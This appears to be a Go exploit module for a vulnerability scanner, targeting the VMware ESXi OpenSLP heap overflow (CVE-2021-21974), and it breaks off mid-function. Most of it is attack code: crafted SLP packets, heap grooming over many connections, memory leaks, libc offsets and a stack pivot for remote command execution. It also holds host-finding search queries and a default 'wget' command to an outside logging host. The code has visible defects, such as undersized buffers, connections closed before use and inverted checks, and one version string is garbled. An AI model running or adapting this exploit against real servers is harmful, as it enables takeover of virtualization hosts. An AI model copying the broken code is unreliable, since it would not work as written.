package exploits

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"net"
	"time"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "VMware ESXi OpenSLP heap overflow vulnerability (CVE-2021-21974)",
    "Description": "<p>VMware ESXi is a server virtualization platform created by Vmware that can be directly installed on physical servers.</p><p>ESXi has a security vulnerability because malicious actors on the same network segment can access port 427, resulting in remote code execution. The following products and versions are affected: 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXI650-20210210210210101-SG. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "vmware-ESXi",
    "Homepage": "https://www.vmware.com/",
    "DisclosureDate": "2021-01-10",
    "Author": "a2efe@hotmail.com",
    "FofaQuery": "body=\"ng-app=\\\"esxUiApp\\\"\" && body=\"<title ng-bind=\\\"$root.title\\\">\"",
    "GobyQuery": "body=\"ng-app=\\\"esxUiApp\\\"\" && body=\"<title ng-bind=\\\"$root.title\\\">\"",
    "Level": "3",
    "Impact": "<p> Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. The vendor has released a bug fix, please pay attention to the update in time:</p><p><a href=\"https://www.vmware.com/\">https://www.vmware.com/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://github.com/Shadow0ps/CVE-2021-21974/blob/main/2021-21974-POC.py"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "wget 3sd.dnslog.cn",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2021-21974"
    ],
    "CNNVD": [
        "CNNVD-202102-1560"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.8",
    "Translation": {
        "CN": {
            "Name": "VMware ESXi OpenSLP 堆溢出漏洞（CVE-2021-21974）",
            "Product": "vmware-ESXi",
            "Description": "<p>VMware ESXi是美国威睿（Vmware）公司的一套可直接安装在物理服务器上的服务器虚拟化平台。</p><p>ESXi 存在安全漏洞，该漏洞源于同一网段的恶意行为者可以访问端口427，导致远程代码执行。以下产品及版本受到影响：7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXi650-202102101-SG。攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>1、厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.vmware.com/\">https://www.vmware.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "VMware ESXi OpenSLP heap overflow vulnerability (CVE-2021-21974)",
            "Product": "vmware-ESXi",
            "Description": "<p>VMware ESXi is a server virtualization platform created by Vmware that can be directly installed on physical servers.<br></p><p>ESXi has a security vulnerability because malicious actors on the same network segment can access port 427, resulting in remote code execution. The following products and versions are affected: 7.0 before ESXi70U1c-17325551, 6.7 before ESXi670-202102401-SG, 6.5 before ESXI650-20210210210210101-SG. Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "Recommendation": "<p>1. The vendor has released a bug fix, please pay attention to the update in time:</p><p><a href=\"https://www.vmware.com/\">https://www.vmware.com/</a><br></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>&nbsp;Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9935"
}`
	sendMessagejzd542 := func(con net.Conn, payload []byte) (result string, err error) {
		_, err = con.Write(payload)
		if err != nil {
			return "", err
		}
		resp := make([]byte, 4096)
		_, err = con.Read(resp)
		if err != nil {
			return "", err
		}
		return string(resp), nil
	}

	getConnect := func(target string) (net.Conn, error) {
		con, err := httpclient.GetTCPConn(target, time.Second*3)
		defer con.Close()
		if err != nil {
			return nil, err
		}
		return con, nil
	}
	generateSlpHeader := func(payload []byte, functionID uint8, xid uint16, extOffset uint32) []byte {
		packetlen := len(payload) + 16
		if extOffset != 0 {
			extOffset += 16
		}
		header := make([]byte, 0)
		header = append(header, 2, functionID)
		packetLenBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(packetLenBytes, uint32(packetlen))
		header = append(header, packetLenBytes[1:]...)
		extOffsetBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(extOffsetBytes, uint32(extOffset))
		header = append(header, extOffsetBytes[1:3]...)
		xidBytes := make([]byte, 2)
		binary.BigEndian.PutUint16(xidBytes, xid)
		header = append(header, xidBytes...)
		header = append(header, 2)
		header = append(header, []byte("en")...)
		return header
	}

	daAdvertRequest := func(urlBytes []byte, scopesBytes []byte) []byte {
		errorCode := uint16(0)
		bootTime := uint32(time.Now().Unix())
		attributes := make([]byte, 0)
		spi := make([]byte, 0)
		authBlocks := make([]byte, 0)
		payload := make([]byte, 0)
		payload = append(payload, make([]byte, 2)...)
		binary.BigEndian.PutUint16(payload[0:2], errorCode)
		payload = append(payload, make([]byte, 4)...)
		binary.BigEndian.PutUint32(payload[2:6], bootTime)
		payload = append(payload, make([]byte, 2)...)
		binary.BigEndian.PutUint16(payload[6:8], uint16(len(urlBytes)))
		payload = append(payload, urlBytes...)
		payload = append(payload, make([]byte, 2)...)
		binary.BigEndian.PutUint16(payload[len(payload)-2:len(payload)], uint16(len(scopesBytes)))
		payload = append(payload, scopesBytes...)
		payload = append(payload, make([]byte, 2)...)
		binary.BigEndian.PutUint16(payload[len(payload)-2:len(payload)], uint16(len(attributes)))
		payload = append(payload, attributes...)
		payload = append(payload, make([]byte, 2)...)
		binary.BigEndian.PutUint16(payload[len(payload)-2:len(payload)], uint16(len(spi)))
		payload = append(payload, spi...)
		payload = append(payload, make([]byte, 2)...)
		binary.BigEndian.PutUint16(payload[len(payload)-2:len(payload)], uint16(len(authBlocks)))
		payload = append(payload, authBlocks...)
		return append(generateSlpHeader(payload, 8, 0, 0), payload...)
	}

	packUint8 := func(i int) []byte {
		b := make([]byte, 1)
		b[0] = byte(i)
		return b
	}

	packUint16BigEndian := func(i int) []byte {
		b := make([]byte, 2)
		binary.BigEndian.PutUint16(b, uint16(i))
		return b
	}

	packUint32LittleEndian := func(i int) []byte {
		b := make([]byte, 2)
		binary.LittleEndian.PutUint32(b, uint32(i))
		return b
	}

	generateSrvRqst := func(data []byte) []byte {
		var srvtype, prlist, scopes, predicate []byte
		spi := data
		payload := make([]byte, 0)
		prlistLen := len(prlist)
		srvtypeLen := len(srvtype)
		scopesLen := len(scopes)
		predicateLen := len(predicate)
		spiLen := len(spi)
		payload = append(payload, packUint16BigEndian(prlistLen)...)
		payload = append(payload, prlist...)
		payload = append(payload, packUint16BigEndian(srvtypeLen)...)
		payload = append(payload, srvtype...)
		payload = append(payload, packUint16BigEndian(scopesLen)...)
		payload = append(payload, scopes...)
		payload = append(payload, packUint16BigEndian(predicateLen)...)
		payload = append(payload, predicate...)
		payload = append(payload, packUint16BigEndian(spiLen)...)
		payload = append(payload, spi...)
		return generateSlpHeader(payload, 1, 5, 0)
	}

	block := func(size int) []byte {
		if size > 0x38 {
			size = size - 0x38
		} else {
			size = 1
		}
		var b []byte
		for i := 0; i < size; i++ {
			b = append(b, 'A')
		}
		return generateSrvRqst(b)
	}

	generateSrvReg := func(url string, srvtype []byte, scopes []byte, attributes []byte) []byte {
		var attribAuthBlocks []byte
		lifetime := 2 * 60 // seconds
		var authBlocks []byte
		urlEntry := make([]byte, 0)
		urlEntry = append(urlEntry, 0)
		urlEntry = append(urlEntry, packUint16BigEndian(lifetime)...)
		urlEntry = append(urlEntry, packUint16BigEndian(len(url))...)
		urlEntry = append(urlEntry, []byte(url)...)
		urlEntry = append(urlEntry, packUint8(len(authBlocks))...)
		urlEntry = append(urlEntry, authBlocks...)
		payload := make([]byte, 0)
		payload = append(payload, urlEntry...)
		payload = append(payload, packUint16BigEndian(len(srvtype))...)
		payload = append(payload, srvtype...)
		payload = append(payload, packUint16BigEndian(len(scopes))...)
		payload = append(payload, scopes...)
		payload = append(payload, packUint16BigEndian(len(attributes))...)
		payload = append(payload, attributes...)
		payload = append(payload, packUint8(len(attribAuthBlocks))...)
		payload = append(payload, attribAuthBlocks...)
		return payload
	}

	updateTargetSlpdsocket := func(fd int, size int, state int) []byte {
		payload := make([]byte, 0)
		payload = append(payload, []byte{0xd0, 0x00, 0x00, 0x00}...)
		payload = append(payload, []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xbe, 0xba, 0xfe, 0xca}...)
		payload = append(payload, packUint32LittleEndian(fd)...)
		payload = append(payload, []byte{0x00, 0x00, 0x00, 0x00}...)
		payload = append(payload, packUint32LittleEndian(state)...)
		payload = append(payload, []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}...)
		payload = append(payload, []byte{0x02, 0x00, 0x00, 0x00}...)
		payload = append(payload, []byte{0x7f, 0x00, 0x00, 0x01}...)
		payload = append(payload, []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}...)
		filler := bytes.Repeat([]byte{'A'}, size-0x76)
		payload = append(filler, payload...)
		return generateSrvRqst(payload)
	}
	overflowAndExtend := func(size int, flag int) []byte {
		arg1 := bytes.Repeat([]byte{'A'}, 24)
		arg2 := append(bytes.Repeat([]byte{'B'}, 13), packUint16BigEndian(size+flag)...)
		arg2 = append(arg2, []byte(":/")...)
		arg2 = append(arg2, bytes.Repeat([]byte{'C'}, 647)...)
		return daAdvertRequest(arg1, arg2)
	}

	generateAttribRqst := func(urlBytes []byte) []byte {
		scopes := []byte("DEFAULT")
		prlist := []byte{}
		tags := []byte{}
		spi := []byte{}
		payload := make([]byte, 0)
		payload = append(payload, packUint16BigEndian(len(prlist))...)
		payload = append(payload, prlist...)
		payload = append(payload, packUint16BigEndian(len(urlBytes))...)
		payload = append(payload, urlBytes...)
		payload = append(payload, packUint16BigEndian(len(scopes))...)
		payload = append(payload, scopes...)
		payload = append(payload, packUint16BigEndian(len(tags))...)
		payload = append(payload, tags...)
		payload = append(payload, packUint16BigEndian(len(spi))...)
		payload = append(payload, spi...)
		return append(generateSlpHeader(payload, 8, 0, 0), payload...)
	}
	partialUpdateTargetSendBuffer := func(size int, sendBufferSize int, flag int, data []byte) []byte {
		payload := make([]byte, 0)
		payload = append(payload, packUint32LittleEndian(sendBufferSize+flag)...)
		payload = append(payload, []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}...)
		payload = append(payload, packUint32LittleEndian(sendBufferSize-0x20)...)
		payload = append(payload, data...)
		filler := bytes.Repeat([]byte{'A'}, int(size-0x56))
		payload = append(filler, payload...)
		return generateSrvRqst(payload)
	}

	leak := func(con net.Conn, arg1 int) (globalLeakedData []byte, err error) {
		var outgoing []byte
		var incoming []byte
		if arg1 > 0 {
			outgoing = make([]byte, arg1)
			for i := 0; i < arg1; i++ {
				b := make([]byte, 1)
				_, err = con.Read(b)
				if err != nil {
					return outgoing, err
				}
				outgoing[i] = b[0]
			}
			// fmt.Printf("%x\n", outgoing)
			globalLeakedData = outgoing

		} else {
			for {
				incoming = make([]byte, 1)
				_, err = con.Read(incoming)
				if err != nil {
					return incoming, err
				}
				outgoing = append(outgoing, incoming...)
				var MARKER = []byte{0xef, 0xbe, 0xad, 0xde}
				if bytes.Contains(outgoing, MARKER) {
					break
				}
			}
			globalLeakedValues := make([]uint32, 0)
			for i := 0; i < len(outgoing); i += 4 {
				v := binary.LittleEndian.Uint32(outgoing[i : i+4])
				globalLeakedValues = append(globalLeakedValues, v)
			}
		}
		return globalLeakedData, nil
	}
	updateTargetSendBuffer := func(size, sendBufferSize, flag int, address int, length int) []byte {
		var payload []byte
		// Pack the payload
		payload = append(payload, packUint32LittleEndian(sendBufferSize+flag)...)
		payload = append(payload, bytes.Repeat([]byte{0}, 8)...)
		payload = append(payload, packUint32LittleEndian(sendBufferSize-0x20)...)
		payload = append(payload, packUint32LittleEndian(address)...)
		payload = append(payload, packUint32LittleEndian(address)...)
		payload = append(payload, packUint32LittleEndian(address+length)...)
		payload = append(payload, bytes.Repeat([]byte{0}, 0x10)...)
		// Add filler
		filler := bytes.Repeat([]byte{'A'}, size-0x66)
		payload = append(filler, payload...)
		return generateSrvRqst(payload)
	}

	updateTargetRecvBuffer := func(size int, address int) []byte {
		size += 0x1a
		payload := []byte{0x40, 0x00, 0x00, 0x00}
		payload = append(payload, make([]byte, 8)...)
		binary.LittleEndian.PutUint32(payload[len(payload):], uint32(size))
		addr := address - 26
		for i := 0; i < 2; i++ {
			binary.LittleEndian.PutUint32(payload[len(payload):], uint32(addr))
			payload = payload[:len(payload)+4]
		}
		binary.LittleEndian.PutUint32(payload[len(payload):], uint32(addr+size))
		filler := bytes.Repeat([]byte{'A'}, 0xca)
		payload = append(filler, payload...)
		return generateSrvRqst(payload)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 目标存活检测
			target := fmt.Sprintf("%s:427", u.IP)
			// con1 conect
			con, err := getConnect(target)
			if err != nil {
				return false
			}
			// con1 daAdvertRequest
			_, err = sendMessagejzd542(con, daAdvertRequest([]byte("roflmao://pwning"), []byte("BBB")))
			if err != nil {
				return false
			}
			con2, err := getConnect(target)
			if err != nil {
				return false
			}
			con3, err := getConnect(target)
			if err != nil {
				return false
			}
			con4, err := getConnect(target)
			if err != nil {
				return false
			}
			con5, err := getConnect(target)
			if err != nil {
				return false
			}
			// con2 3 4 5 6 block
			_, err = sendMessagejzd542(con2, block(0x40))
			if err != nil {
				return false
			}
			_, err = sendMessagejzd542(con3, block(0x40))
			if err != nil {
				return false
			}
			_, err = sendMessagejzd542(con4, block(0x40))
			if err != nil {
				return false
			}
			_, err = sendMessagejzd542(con5, block(0x40))
			if err != nil {
				return false
			}
			con6, err := getConnect(target)
			if err != nil {
				return false
			}
			_, err = sendMessagejzd542(con6, block(0x810))
			if err != nil {
				return false
			}
			con7, err := getConnect(target)
			if err != nil {
				return false
			}
			con8, err := getConnect(target)
			if err != nil {
				return false
			}
			con9, err := getConnect(target)
			if err != nil {
				return false
			}
			// con9 overflowAndExtend
			_, err = sendMessagejzd542(con9, overflowAndExtend(0x140, 0x1))
			if err != nil {
				return false
			}
			// con8 updateTargetSlpdsocket
			_, err = sendMessagejzd542(con8, updateTargetSlpdsocket(0xc, 0x140, 0x6d))
			if err != nil {
				return false
			}
			// con 7 serviceRegistration
			var MARKER = []byte{0xef, 0xbe, 0xad, 0xde}
			attributes := make([]byte, 0)
			attributes = append(attributes, MARKER...)
			attributes = append(attributes, bytes.Repeat([]byte{'B'}, 0x3200-21-4)...)
			_, err = sendMessagejzd542(con7, generateSrvReg("127.0.0.1", []byte("service:pwn"), []byte("default"), attributes))
			if err != nil {
				return false
			}
			// con8 updateTargetSlpdsocket
			_, err = sendMessagejzd542(con8, updateTargetSlpdsocket(0x8, 0x140, 0x65))
			if err != nil {
				return false
			}
			con10, err := getConnect(target)
			if err != nil {
				return false
			}
			// con10 block
			_, err = sendMessagejzd542(con10, block(0x70))
			if err != nil {
				return false
			}
			con11, err := getConnect(target)
			if err != nil {
				return false
			}
			con12, err := getConnect(target)
			if err != nil {
				return false
			}
			con13, err := getConnect(target)
			if err != nil {
				return false
			}
			// con11 block
			_, err = sendMessagejzd542(con11, block(0x810))
			if err != nil {
				return false
			}
			con14, err := getConnect(target)
			if err != nil {
				return false
			}
			// con14 block
			_, err = sendMessagejzd542(con14, block(0x160))
			if err != nil {
				return false
			}
			// con12 block
			_, err = sendMessagejzd542(con12, block(0x810))
			if err != nil {
				return false
			}
			con15, err := getConnect(target)
			if err != nil {
				return false
			}
			// con15 generateAttribRqst
			_, err = sendMessagejzd542(con15, generateAttribRqst([]byte("service:pwn")))
			if err != nil {
				return false
			}
			// con13 block
			_, err = sendMessagejzd542(con13, block(0x110))
			if err != nil {
				return false
			}
			con16, err := getConnect(target)
			if err != nil {
				return false
			}
			con17, err := getConnect(target)
			if err != nil {
				return false
			}
			con18, err := getConnect(target)
			if err != nil {
				return false
			}
			// con18 overflowAndExtend
			_, err = sendMessagejzd542(con18, overflowAndExtend(0x120, 0x3))
			if err != nil {
				return false
			}
			con19, err := getConnect(target)
			if err != nil {
				return false
			}
			// con19 block
			_, err = sendMessagejzd542(con19, block(0x178))
			if err != nil {
				return false
			}
			// con17 partialUpdateTargetSendBuffer
			_, err = sendMessagejzd542(con17, partialUpdateTargetSendBuffer(0x120, 0x3220, 0x1, []byte{0x00, 0x00}))
			if err != nil {
				return false
			}
			con20, err := getConnect(target)
			if err != nil {
				return false
			}
			// con20 overflowAndExtend
			_, err = sendMessagejzd542(con20, overflowAndExtend(0x140, 0x1))
			if err != nil {
				return false
			}
			// con16 updateTargetSlpdsocket
			_, err = sendMessagejzd542(con16, updateTargetSlpdsocket(0x11, 0x140, 0x6f))
			if err != nil {
				return false
			}
			_, err = sendMessagejzd542(con16, updateTargetSlpdsocket(0x8, 0x140, 0x65))
			if err != nil {
				return false
			}
			con21, err := getConnect(target)
			if err != nil {
				return false
			}
			// con21 block
			_, err = sendMessagejzd542(con21, block(0x178))
			if err != nil {
				return false
			}
			// con15 leak
			data, err := leak(con15, -1)
			leakedData := data
			if err != nil {
				return false
			}
			if leakedData != nil || len(leakedData) == 0 {
				return false
			}
			for i, j := 0, len(leakedData)-1; i < j; i, j = i+1, j-1 {
				leakedData[i], leakedData[j] = leakedData[j], leakedData[i]
			}
			if int(leakedData[0]) != 0xdeadbeef || int(leakedData[0]) != 0xefeb3174 {
				return false
			}
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			// 目标存活检测
			target := fmt.Sprintf("%s:427", expResult.HostInfo.IP)
			// con1 conect
			con, err := getConnect(target)
			if err != nil {
				return expResult
			}
			// con1 daAdvertRequest
			_, err = sendMessagejzd542(con, daAdvertRequest([]byte("roflmao://pwning"), []byte("BBB")))
			if err != nil {
				return expResult
			}
			con2, err := getConnect(target)
			if err != nil {
				return expResult
			}
			con3, err := getConnect(target)
			if err != nil {
				return expResult
			}
			con4, err := getConnect(target)
			if err != nil {
				return expResult
			}
			con5, err := getConnect(target)
			if err != nil {
				return expResult
			}
			// con2 3 4 5 6 block
			_, err = sendMessagejzd542(con2, block(0x40))
			if err != nil {
				return expResult
			}
			_, err = sendMessagejzd542(con3, block(0x40))
			if err != nil {
				return expResult
			}
			_, err = sendMessagejzd542(con4, block(0x40))
			if err != nil {
				return expResult
			}
			_, err = sendMessagejzd542(con5, block(0x40))
			if err != nil {
				return expResult
			}
			con6, err := getConnect(target)
			if err != nil {
				return expResult
			}
			_, err = sendMessagejzd542(con6, block(0x810))
			if err != nil {
				return expResult
			}
			con7, err := getConnect(target)
			if err != nil {
				return expResult
			}
			con8, err := getConnect(target)
			if err != nil {
				return expResult
			}
			con9, err := getConnect(target)
			if err != nil {
				return expResult
			}
			// con9 overflowAndExtend
			_, err = sendMessagejzd542(con9, overflowAndExtend(0x140, 0x1))
			if err != nil {
				return expResult
			}
			// con8 updateTargetSlpdsocket
			_, err = sendMessagejzd542(con8, updateTargetSlpdsocket(0xc, 0x140, 0x6d))
			if err != nil {
				return expResult
			}
			// con 7 serviceRegistration
			var MARKER = []byte{0xef, 0xbe, 0xad, 0xde}
			attributes := make([]byte, 0)
			attributes = append(attributes, MARKER...)
			attributes = append(attributes, bytes.Repeat([]byte{'B'}, 0x3200-21-4)...)
			_, err = sendMessagejzd542(con7, generateSrvReg("127.0.0.1", []byte("service:pwn"), []byte("default"), attributes))
			if err != nil {
				return expResult
			}
			// con8 updateTargetSlpdsocket
			_, err = sendMessagejzd542(con8, updateTargetSlpdsocket(0x8, 0x140, 0x65))
			if err != nil {
				return expResult
			}
			con10, err := getConnect(target)
			if err != nil {
				return expResult
			}
			// con10 block
			_, err = sendMessagejzd542(con10, block(0x70))
			if err != nil {
				return expResult
			}
			con11, err := getConnect(target)
			if err != nil {
				return expResult
			}
			con12, err := getConnect(target)
			if err != nil {
				return expResult
			}
			con13, err := getConnect(target)
			if err != nil {
				return expResult
			}
			// con11 block
			_, err = sendMessagejzd542(con11, block(0x810))
			if err != nil {
				return expResult
			}
			con14, err := getConnect(target)
			if err != nil {
				return expResult
			}
			// con14 block
			_, err = sendMessagejzd542(con14, block(0x160))
			if err != nil {
				return expResult
			}
			// con12 block
			_, err = sendMessagejzd542(con12, block(0x810))
			if err != nil {
				return expResult
			}
			con15, err := getConnect(target)
			if err != nil {
				return expResult
			}
			// con15 generateAttribRqst
			_, err = sendMessagejzd542(con15, generateAttribRqst([]byte("service:pwn")))
			if err != nil {
				return expResult
			}
			// con13 block
			_, err = sendMessagejzd542(con13, block(0x110))
			if err != nil {
				return expResult
			}
			con16, err := getConnect(target)
			if err != nil {
				return expResult
			}
			con17, err := getConnect(target)
			if err != nil {
				return expResult
			}
			con18, err := getConnect(target)
			if err != nil {
				return expResult
			}
			// con18 overflowAndExtend
			_, err = sendMessagejzd542(con18, overflowAndExtend(0x120, 0x3))
			if err != nil {
				return expResult
			}
			con19, err := getConnect(target)
			if err != nil {
				return expResult
			}
			// con19 block
			_, err = sendMessagejzd542(con19, block(0x178))
			if err != nil {
				return expResult
			}
			// con17 partialUpdateTargetSendBuffer
			_, err = sendMessagejzd542(con17, partialUpdateTargetSendBuffer(0x120, 0x3220, 0x1, []byte{0x00, 0x00}))
			if err != nil {
				return expResult
			}
			con20, err := getConnect(target)
			if err != nil {
				return expResult
			}
			// con20 overflowAndExtend
			_, err = sendMessagejzd542(con20, overflowAndExtend(0x140, 0x1))
			if err != nil {
				return expResult
			}
			// con16 updateTargetSlpdsocket
			_, err = sendMessagejzd542(con16, updateTargetSlpdsocket(0x11, 0x140, 0x6f))
			if err != nil {
				return expResult
			}
			_, err = sendMessagejzd542(con16, updateTargetSlpdsocket(0x8, 0x140, 0x65))
			if err != nil {
				return expResult
			}
			con21, err := getConnect(target)
			if err != nil {
				return expResult
			}
			// con21 block
			_, err = sendMessagejzd542(con21, block(0x178))
			if err != nil {
				return expResult
			}
			// con15 leak
			data, err := leak(con15, -1)
			leakedData := data
			if err != nil {
				return expResult
			}
			if leakedData != nil || len(leakedData) == 0 {
				return expResult
			}
			for i, j := 0, len(leakedData)-1; i < j; i, j = i+1, j-1 {
				leakedData[i], leakedData[j] = leakedData[j], leakedData[i]
			}
			var heapAddress int
			var libcLeakLocation int
			if int(leakedData[0]) == 0xdeadbeef {
				heapAddress = int(leakedData[6]) - 0x3220 + 0x4
			} else if int(leakedData[0]) == 0xefeb3174 {
				heapOffset := 0x2b1
				if int(leakedData[42]) == 0x42424242 {
					heapOffset = 0x5d61
				}
				heapAddress = int(leakedData[14]) + heapOffset
			} else {
				return expResult
			}
			libcLeakLocation = heapAddress - 0x100 + 4
			con22, err := getConnect(target)
			if err != nil {
				return expResult
			}
			// con22 block
			_, err = sendMessagejzd542(con22, block(0x810))
			if err != nil {
				return expResult
			}
			con23, err := getConnect(target)
			if err != nil {
				return expResult
			}
			// con23 block
			_, err = sendMessagejzd542(con23, block(0x100))
			if err != nil {
				return expResult
			}
			con24, err := getConnect(target)
			if err != nil {
				return expResult
			}
			// con24 block
			_, err = sendMessagejzd542(con24, block(0x810))
			if err != nil {
				return expResult
			}
			con25, err := getConnect(target)
			if err != nil {
				return expResult
			}
			// con25 block
			_, err = sendMessagejzd542(con25, block(0x698))
			if err != nil {
				return expResult
			}
			con26, err := getConnect(target)
			if err != nil {
				return expResult
			}
			con27, err := getConnect(target)
			if err != nil {
				return expResult
			}
			con28, err := getConnect(target)
			if err != nil {
				return expResult
			}
			// con26 overflowAndExtend
			_, err = sendMessagejzd542(con26, overflowAndExtend(0x130, 0x1))
			if err != nil {
				return expResult
			}
			// con27 updateTargetSendBuffer
			_, err = sendMessagejzd542(con27, updateTargetSendBuffer(0x130, 0x598, 0x1, libcLeakLocation, 0x4))
			if err != nil {
				return expResult
			}
			con29, err := getConnect(target)
			if err != nil {
				return expResult
			}
			// con29 block
			_, err = sendMessagejzd542(con29, block(0x178))
			if err != nil {
				return expResult
			}
			con30, err := getConnect(target)
			if err != nil {
				return expResult
			}
			// con30 overflowAndExtend
			_, err = sendMessagejzd542(con30, overflowAndExtend(0x140, 0x1))
			if err != nil {
				return expResult
			}
			con31, err := getConnect(target)
			if err != nil {
				return expResult
			}
			// con28 updateTargetSlpdsocket
			_, err = sendMessagejzd542(con28, updateTargetSlpdsocket(0x15, 0x140, 0x6f))
			if err != nil {
				return expResult
			}
			_, err = sendMessagejzd542(con28, updateTargetSlpdsocket(0x8, 0x140, 0x65))
			if err != nil {
				return expResult
			}
			// con31 block
			_, err = sendMessagejzd542(con31, block(0x178))
			if err != nil {
				return expResult
			}
			// con25 leak
			leakedData, err = leak(con25, 0x4)
			if err != nil {
				return expResult
			}
			time.Sleep(time.Second * 1)
			libcBaseAddress := uintptr(binary.LittleEndian.Uint32(leakedData)) - 0x193568
			libcRetAddress := libcBaseAddress + 0x0008009c
			libcSystemAddress := libcBaseAddress + 0x0003e390
			libcEnvironAddress := libcBaseAddress + 0x00194e20
			libcFreeHookAddress := libcBaseAddress + 0x001948d8
			shellCmdAddress := heapAddress + 0x34
			gadgetAddress := libcBaseAddress + 0x0007fe01 // add esp, 0x100 ; ret
			// con27 updateTargetSendBuffer
			_, err = sendMessagejzd542(con27, updateTargetSendBuffer(0x130, 0x598, 0x1, int(libcEnvironAddress), 0x4))
			if err != nil {
				return expResult
			}
			// con28 updateTargetSlpdsocket
			_, err = sendMessagejzd542(con27, updateTargetSlpdsocket(0x15, 0x140, 0x6f))
			if err != nil {
				return expResult
			}
			// con25 leak
			leakedData, err = leak(con25, 0x4)
			if err != nil {
				return expResult
			}
			time.Sleep(time.Second * 1)
			stackEnvironAddress := binary.LittleEndian.Uint32(leakedData)
			espValue := stackEnvironAddress - 0xe7c
			pivotedEspValue := espValue + 0x100
			// con28 updateTargetSlpdsocket
			_, err = sendMessagejzd542(con27, updateTargetSlpdsocket(0x8, 0x140, 0x65))
			if err != nil {
				return expResult
			}
			con32, err := getConnect(target)
			if err != nil {
				return expResult
			}
			// con32 block
			_, err = sendMessagejzd542(con32, block(0x178))
			if err != nil {
				return expResult
			}
			con33, err := getConnect(target)
			if err != nil {
				return expResult
			}
			con34, err := getConnect(target)
			if err != nil {
				return expResult
			}
			// con34 block
			_, err = sendMessagejzd542(con34, block(0x810))
			if err != nil {
				return expResult
			}
			// con33 block
			_, err = sendMessagejzd542(con33, block(0x100))
			if err != nil {
				return expResult
			}
			con35, err := getConnect(target)
			if err != nil {
				return expResult
			}
			con36, err := getConnect(target)
			if err != nil {
				return expResult
			}
			con37, err := getConnect(target)
			if err != nil {
				return expResult
			}
			// con37 overflowAndExtend
			_, err = sendMessagejzd542(con37, overflowAndExtend(0x120, 0x3))
			if err != nil {
				return expResult
			}
			// con36 updateTargetRecvBuffer
			_, err = sendMessagejzd542(con36, updateTargetRecvBuffer(0x4, shellCmdAddress))
			if err != nil {
				return expResult
			}
			con38, err := getConnect(target)
			if err != nil {
				return expResult
			}
			// con38 block
			_, err = sendMessagejzd542(con38, block(0x178))
			if err != nil {
				return expResult
			}
			con39, err := getConnect(target)
			if err != nil {
				return expResult
			}
			// con39 overflowAndExtend
			_, err = sendMessagejzd542(con39, overflowAndExtend(0x140, 0x1))
			if err != nil {
				return expResult
			}
			// con35
			_, err = sendMessagejzd542(con35, updateTargetSlpdsocket(0x8, 0x140, 0x65))
			if err != nil {
				return expResult
			}
